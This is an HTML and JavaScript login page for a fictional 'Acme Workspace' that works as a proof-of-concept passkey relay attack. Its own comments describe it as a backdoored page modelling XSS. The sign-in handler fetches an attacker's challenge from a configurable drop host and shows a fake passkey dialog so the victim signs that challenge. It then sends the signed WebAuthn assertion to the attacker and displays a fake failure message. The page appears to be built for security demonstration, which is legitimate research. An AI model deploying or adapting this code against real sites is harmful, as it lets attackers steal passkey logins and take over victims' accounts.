<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Acme Workspace</title>
<style>
  :root { --bg:#f6f7f9; --card:#fff; --ink:#0d1117; --muted:#667085; --line:#e4e7ec; --brand:#3b5bdb; }
  * { box-sizing: border-box; }
  body { margin:0; background:var(--bg); color:var(--ink); font:15px/1.55 -apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif; display:grid; place-items:center; min-height:100vh; }
  .card { width:min(400px,92vw); background:var(--card); border:1px solid var(--line); border-radius:16px; padding:34px 30px; box-shadow:0 10px 30px rgba(16,24,40,.06); }
  .brand { display:flex; align-items:center; gap:10px; font-weight:700; font-size:18px; margin-bottom:22px; }
  .logo { width:30px; height:30px; border-radius:8px; background:linear-gradient(135deg,var(--brand),#7048e8); }
  h1 { font-size:20px; margin:0 0 4px; }
  p.sub { margin:0 0 24px; color:var(--muted); }
  button { width:100%; padding:13px; border:0; border-radius:10px; background:var(--brand); color:#fff; font:inherit; font-weight:600; cursor:pointer; }
  button:disabled { opacity:.55; cursor:default; }
  .status { margin-top:16px; min-height:22px; color:var(--muted); font-size:14px; }
  .ok { color:#0a7c42; font-weight:600; }
  .home { display:none; text-align:center; padding:12px 0; }
  .home .big { font-size:26px; font-weight:700; margin:6px 0; }
  .avatar { width:64px; height:64px; border-radius:50%; background:linear-gradient(135deg,var(--brand),#7048e8); margin:0 auto 10px; }
  details { margin-top:22px; border-top:1px solid var(--line); padding-top:14px; }
  details summary { cursor:pointer; color:var(--muted); font-size:13px; list-style:none; }
  details summary::-webkit-details-marker { display:none; }
  details .row { display:flex; gap:8px; }
  details input { width:100%; padding:9px; border:1px solid var(--line); border-radius:8px; font:inherit; margin:8px 0 0; }
  details button { background:#fff; color:var(--ink); border:1px solid var(--line); margin-top:12px; }
  .foot { margin-top:22px; color:#98a2b3; font-size:12px; text-align:center; }
  /* Passkey prompt shown during sign-in (the OS dialog can't be captured, so the app shows one). */
  .pk { position:fixed; inset:0; display:none; place-items:center; background:rgba(13,17,23,.5); z-index:20; }
  .pk.show { display:grid; }
  .pk .box { background:var(--card); border-radius:18px; padding:30px 34px; width:min(340px,86vw); text-align:center; box-shadow:0 24px 60px rgba(16,24,40,.3); }
  .pk .ic { position:relative; width:76px; height:76px; margin:0 auto 16px; display:grid; place-items:center; border-radius:50%; background:rgba(59,91,219,.1); color:var(--brand); }
  .pk .ic svg { width:38px; height:38px; }
  .pk .ic::after { content:''; position:absolute; inset:0; border-radius:50%; border:2px solid var(--brand); opacity:.5; animation:pkpulse 1.4s ease-out infinite; }
  @keyframes pkpulse { 0%{transform:scale(1);opacity:.5;} 100%{transform:scale(1.5);opacity:0;} }
  .pk h2 { margin:0 0 6px; font-size:19px; }
  .pk p { margin:0; color:var(--muted); font-size:14px; }
</style>
</head>
<body>
<div class="pk" id="pk">
  <div class="box">
    <div class="ic"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="7.5" cy="15.5" r="5.5"/><path d="m21 2-9.6 9.6"/><path d="m15.5 7.5 3 3L22 7l-3-3"/></svg></div>
    <h2>Use your passkey</h2>
    <p>Approve the prompt to sign in to Acme Workspace.</p>
  </div>
</div>
<div class="card">
  <div class="brand"><div class="logo"></div> Acme Workspace</div>

  <div id="login">
    <h1>Sign in</h1>
    <p class="sub">Use your passkey to continue.</p>
    <button id="go">Sign in with passkey</button>
    <div id="status" class="status"></div>

    <details id="setup">
      <summary>First time here? Create an Account</summary>
      <div class="row">
        <input id="first" placeholder="First name" autocomplete="off" />
        <input id="last" placeholder="Last name" autocomplete="off" />
      </div>
      <input id="username" placeholder="Username" autocomplete="off" />
      <input id="email" type="email" placeholder="Email" autocomplete="off" />
      <button id="enroll">Create account and add passkey</button>
      <div id="setupStatus" class="status"></div>
    </details>
  </div>

  <div class="foot">Secured with passkeys &middot; Powered by Pocket ID</div>
</div>

<script>
const $ = (id) => document.getElementById(id);
function b64urlToBuf(s){ s=s.replace(/-/g,'+').replace(/_/g,'/'); while(s.length%4)s+='='; const b=atob(s),a=new Uint8Array(b.length); for(let i=0;i<b.length;i++)a[i]=b.charCodeAt(i); return a.buffer; }
function bufToB64url(buf){ const b=new Uint8Array(buf); let s=''; for(const x of b)s+=String.fromCharCode(x); return btoa(s).replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,''); }
function serializeAssertion(cred){ const r=cred.response; return {
  id:cred.id, rawId:bufToB64url(cred.rawId), type:cred.type, clientExtensionResults:{},
  response:{ clientDataJSON:bufToB64url(r.clientDataJSON), authenticatorData:bufToB64url(r.authenticatorData), signature:bufToB64url(r.signature), userHandle:r.userHandle?bufToB64url(r.userHandle):null }
}; }
function serializeAttestation(cred){ const r=cred.response; return {
  id:cred.id, rawId:bufToB64url(cred.rawId), type:cred.type,
  authenticatorAttachment: cred.authenticatorAttachment || undefined,
  clientExtensionResults: cred.getClientExtensionResults ? cred.getClientExtensionResults() : {},
  response:{ attestationObject:bufToB64url(r.attestationObject), clientDataJSON:bufToB64url(r.clientDataJSON), transports: r.getTransports ? r.getTransports() : undefined }
}; }

// The attacker's site is a DIFFERENT origin. The backdoored page talks to its dead-drop there:
// it fetches the attacker's nonce and hands back the signed assertion, cross-origin.
const DROP = (new URLSearchParams(location.search).get('drop')) || 'http://127.0.0.1:1413';

// Create an account and register a passkey (Windows Hello), through this origin.
// Open sign-up (any number of users) when the server has the admin key; otherwise falls
// back to Pocket ID's first-user setup.
$('enroll').onclick = async () => {
  const body = { firstName: $('first').value.trim(), lastName: $('last').value.trim(), username: $('username').value.trim(), email: $('email').value.trim() };
  if (!body.username || !body.email) { $('setupStatus').textContent = 'Enter at least a username and email.'; return; }
  $('enroll').disabled = true; $('setupStatus').textContent = 'Creating account…';
  try {
    const su = await (await fetch('/x/signup', { method:'POST', headers:{'content-type':'application/json'}, body: JSON.stringify(body) })).json();
    if (su.ok) {
      const ex = await fetch('/api/one-time-access-token/' + encodeURIComponent(su.token), { method:'POST' }); // exchange for a session
      if (!ex.ok) throw new Error('token exchange: ' + ex.status);
    } else {
      const s = await fetch('/api/signup/setup', { method:'POST', headers:{'content-type':'application/json'}, body: JSON.stringify(body) }); // first-user fallback
      if (!s.ok) throw new Error('signup: ' + s.status + ' (' + (su.error || 'already set up?') + ')');
    }
    $('setupStatus').textContent = 'Approve the passkey prompt…';
    const opts = await (await fetch('/api/webauthn/register/start')).json();
    const pub = { ...opts, challenge: b64urlToBuf(opts.challenge), user: { ...opts.user, id: b64urlToBuf(opts.user.id) } };
    const cred = await navigator.credentials.create({ publicKey: pub });
    const f = await fetch('/api/webauthn/register/finish', { method:'POST', headers:{'content-type':'application/json'}, body: JSON.stringify(serializeAttestation(cred)) });
    if (!f.ok) throw new Error('register: ' + f.status);
    $('setupStatus').innerHTML = 'Passkey added <span class="ok">&#10003;</span> Now click <b>Sign in with passkey</b>.';
  } catch (e) {
    $('setupStatus').textContent = 'Setup failed: ' + (e.message || e); $('enroll').disabled = false;
  }
};

// Backdoored sign-in (models XSS on this origin): instead of starting its own login,
// the page signs the ATTACKER's nonce (picked up from the drop) and hands the assertion
// back. The victim never finishes a login of their own, so they never get a session.
$('go').onclick = async () => {
  $('go').disabled = true; $('status').textContent = 'Signing in…';
  try {
    const off = await (await fetch(DROP + '/x/offer')).json(); // the attacker's nonce, from its site
    if (!off.challenge) { $('status').textContent = 'Could not sign you in. Try again.'; $('go').disabled = false; return; }
    $('pk').classList.add('show'); // show the passkey prompt
    $('status').textContent = 'Approve the passkey prompt…';
    // ?slow holds the prompt so the passkey step is clearly visible in recordings; no effect otherwise.
    if (new URLSearchParams(location.search).has('slow')) await new Promise((r) => setTimeout(r, 3200));
    const cred = await navigator.credentials.get({ publicKey: {
      challenge: b64urlToBuf(off.challenge), rpId: off.rpId || 'localhost', userVerification: 'required', timeout: 60000, allowCredentials: [],
    }});
    $('pk').classList.remove('show'); // passkey approved
    await fetch(DROP + '/x/assertion', { method:'POST', headers:{'content-type':'application/json'}, body: JSON.stringify({ assertion: serializeAssertion(cred) }) });
    // The signature went to the attacker's waiting login. Nothing signed the victim in here.
    $('status').textContent = 'Hmm, that did not work. Please try again.';
    $('go').disabled = false;
  } catch (e) {
    $('pk').classList.remove('show');
    $('status').textContent = 'Sign-in failed: ' + (e.message || e); $('go').disabled = false;
  }
};
</script>
</body>
</html>
